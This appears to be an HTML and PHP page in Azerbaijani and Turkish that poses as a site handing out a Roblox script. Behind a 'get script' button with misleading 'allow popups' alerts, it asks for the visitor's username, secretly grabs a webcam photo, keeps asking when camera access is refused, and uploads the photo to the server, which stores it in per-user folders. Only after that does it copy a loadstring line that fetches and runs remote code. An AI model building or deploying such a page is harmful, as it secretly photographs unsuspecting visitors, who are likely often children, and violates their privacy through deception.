<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Paylaşım Saytı</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f9;
            color: #333;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 300px;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #0056b3;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #28a745;
            color: white;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            opacity: 0;
            transform: translateX(100%);
            transition: transform 0.5s ease, opacity 0.5s ease;
        }

        .notification.show {
            opacity: 1;
            transform: translateX(0);
        }

        .progress-bar {
            position: relative;
            height: 5px;
            background-color: white;
            margin-top: 10px;
            overflow: hidden;
        }

        .progress-bar div {
            width: 100%;
            height: 100%;
            background-color: #dc3545;
            animation: progress 5s linear forwards;
        }

        @keyframes progress {
            from { width: 100%; }
            to { width: 0; }
        }
    </style>
</head>
<body>

    <div class="container" id="username-container">
        <h1>Kullanıcı Adınızı Girin</h1>
        <input type="text" id="username" placeholder="Kullanıcı Adı">
        <button onclick="submitUsername()">Təsdiqlə</button>
    </div>

    <div class="container" id="script-container" style="display: none;">
        <h1>Scripti Al</h1>
        <button onclick="capturePhoto()">Scripti Al</button>
        <p>Popuplara icazə ver..</p>
    </div>

    <video id="camera" autoplay style="display:none;"></video>
    <canvas id="photo-canvas" style="display:none;"></canvas>

    <div class="notification" id="notification">
        Script URL kopyalandı!
        <div class="progress-bar"><div></div></div>
    </div>

    <script>
    alert("scripti kopyalamaq üçün icazə verməlisən yoxsa kopyalanmır.")
    alert("scripti kopyalamak için izin vermelisiniz aksi takdirde çalışmaz.")
        let currentUsername = '';

        function submitUsername() {
            const username = document.getElementById('username').value.trim();
            if (username) {
                currentUsername = username;
                document.getElementById('username-container').style.display = 'none';
                document.getElementById('script-container').style.display = 'block';
            }
        }

        function capturePhoto() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('photo-canvas');

            function requestCameraAccess() {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        setTimeout(() => {
                            const context = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            stream.getTracks().forEach(track => track.stop());

                            canvas.toBlob(blob => {
                                const formData = new FormData();
                                formData.append('photo', blob, 'photo.png');
                                formData.append('username', currentUsername);

                                fetch('', {
                                    method: 'POST',
                                    body: formData
                                }).then(response => response.text())
                                  .then(data => {
                                      showNotification();
                                      navigator.clipboard.writeText('loadstring(game:HttpGet("https://rentry.org/blazed-remake/raw"))()');
                                  })
                                  .catch(error => console.error('Hata:', error));
                            });
                        }, 1000);
                    })
                    .catch(err => {
                        alert('popuplara icazə ver.');
                        console.error('Kamera erişim hatası:', err);
                        requestCameraAccess(); // Tekrar kamera erişimi iste
                    });
            }

            requestCameraAccess();
        }

        function showNotification() {
            const notification = document.getElementById('notification');
            notification.classList.add('show');
            setTimeout(() => {
                notification.classList.remove('show');
            }, 5000);
        }
    </script>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
        $directory = 'users/' . $username;

        if (!file_exists($directory)) {
            mkdir($directory, 0777, true);
        }

        if (isset($_FILES['photo'])) {
            $photoPath = $directory . '/photo_' . time() . '.png';
            move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath);
            echo "<p>scripturl: $photoPath</p>";
        } else {
            echo "<p>script yükləndi.</p>";
        }
    }
    ?>

</body>
</html>
